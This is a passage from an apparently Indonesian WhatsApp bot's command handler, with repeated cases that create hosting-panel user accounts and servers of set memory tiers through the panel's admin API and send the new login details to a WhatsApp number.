            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
case "2gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "2GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "2024"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "2024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
case "3gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "3GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "3024"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "3024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
case "4gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan .4gb username,id_server\n2. Ketik .4gb username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "4GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "4024"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "4024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
case "unli": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "unli";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "0"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "0"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}
break
case "5gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "5GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "5024"; // Memory dalam MB
    const cpu = "0"; // CPU dalam %
    const disk = "5024"; // Disk dalam MB

    try {
        // Buat akun pengguna di sistem
        const createUserResponse = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email: email,
                username: username,
                first_name: username,
                last_name: username,
                language: "en",
                password: password,
            }),
        });

        const userData = await createUserResponse.json();
        if (userData.errors) {
            reply(`Gagal membuat pengguna. Detail error:\n${JSON.stringify(userData.errors[0], null, 2)}`);
            return;
        }

        const user = userData.attributes;

        // Kirim pesan ke admin baru
        await Izz.sendMessage(userIdAdmin, {
            text: `*DETAIL AKUN ANDA*\n\n👤USERNAME: ${username}\n🔐PASSWORD: ${password}\n🌐LOGIN: ${domain}\n\nNOTE:\n1. Simpan data akun ini dengan baik.\n2. Jangan share data akun kepada siapa pun.`,
        });

        // Ambil informasi startup untuk server
        const eggResponse = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const eggData = await eggResponse.json();
        const startupCmd = eggData.attributes.startup;

        // Buat server baru untuk pengguna
        const createServerResponse = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                name: name,
                description: " ",
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    INST: "npm",
                    USER_UPLOAD: "0",
                    AUTO_UPDATE: "0",
                    CMD_RUN: "npm start",
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk,
                    io: 500,
                    cpu: cpu,
                },
                feature_limits: {
                    databases: 5,
                    backups: 5,
                    allocations: 1,
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: [],
                },
            }),
        });

        const serverData = await createServerResponse.json();
        if (serverData.errors) {
            reply(`Gagal membuat server. Detail error:\n${JSON.stringify(serverData.errors[0], null, 2)}`);
            return;
        }

        const server = serverData.attributes;

        // Konfirmasi sukses
        reply(`*SUCCESSFULLY ADD USER + SERVER*\n\n👤USERNAME: ${user.username}\n🖥️MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\n💾DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\n⚙️CPU: ${server.limits.cpu}%`);
    } catch (error) {
        reply("Terjadi kesalahan saat membuat akun atau server. Silakan coba lagi.");
        console.error(error);
    }
}

break
case "6gb": {
    

    // Pastikan hanya owner, premium, atau asisten yang bisa menjalankan
    if (!isOwner && !isPremium && !isAsisten) {
        reply(`Perintah ini hanya untuk owner, premium, atau asisten.`);
        return;
    }

    // Ambil argumen dari input
    const argsSplit = q.split(",");
    const username = argsSplit[0]?.trim(); // Nama pengguna baru
    const quotedOrTagged = m.mentionedJid?.[0] || m.quoted?.sender; // Nomor dari mention atau balasan
    let nomor = quotedOrTagged ? quotedOrTagged.split('@')[0] : null; // Nomor dari mention atau balasan
    let serverChoice = argsSplit[2]?.trim().toLowerCase(); // Server ID dari argumen ketiga

    // Validasi nomor
    if (!nomor) {
        if (argsSplit.length >= 2 && /^\d{4,}$/.test(argsSplit[1])) {
            // Nomor diambil dari argumen kedua jika valid
            nomor = argsSplit[1].trim();
        } else {
            // Jika tidak ada, default ke nomor pengirim
            nomor = m.sender.split('@')[0];
        }
    }

    // Validasi serverChoice
    if (!serverChoice && argsSplit.length >= 2) {
        // Jika hanya ada dua argumen, serverChoice diambil dari argumen kedua
        serverChoice = argsSplit[1].trim().toLowerCase();
    }

    if (!username || !serverChoice) {
        reply(`Format salah! Gunakan format:\n1. Balas pesan dengan ${prefix + command} username,id_server\n2. Ketik ${prefix + command} username,@orang,id_server`);
        return;
    }

    // Tentukan domain dan apikey berdasarkan ID server
    let serverConfig;
    if (["1", "satu"].includes(serverChoice)) {
        if (!isOwner && !isAsisten && !isPremium) return reply(`Only owner dan asisten untuk ID server 1`);
        serverConfig = { domain: global.domain, apikey: global.apikey };
    } else if (["2", "dua"].includes(serverChoice)) {
        if (!isOwner && !isPremium) return reply(`Only owner dan premium untuk ID server 2`);
        serverConfig = { domain: global.domain2, apikey: global.apikey2 };
    } else if (["3", "prib"].includes(serverChoice)) {
        if (!isOwner) return reply(`Only owner untuk ID server prib`);
        serverConfig = { domain: global.domain3, apikey: global.apikey3 };
    } else {
        reply(`Server tidak valid. Gunakan '1', '2', atau 'prib'.`);
        return;
    }

    const { domain, apikey } = serverConfig;
    const userIdAdmin = `${nomor}@s.whatsapp.net`; // Format nomor untuk ID WhatsApp
    const password = generateRandomPassword(6); // Fungsi untuk membuat password acak

    const name = username + "6GB";
    const email = `${username}1398@gmail.com`;
    const egg = global.eggsnya;
    const loc = global.location;
    const memo = "6024"; // Memory dalam MB
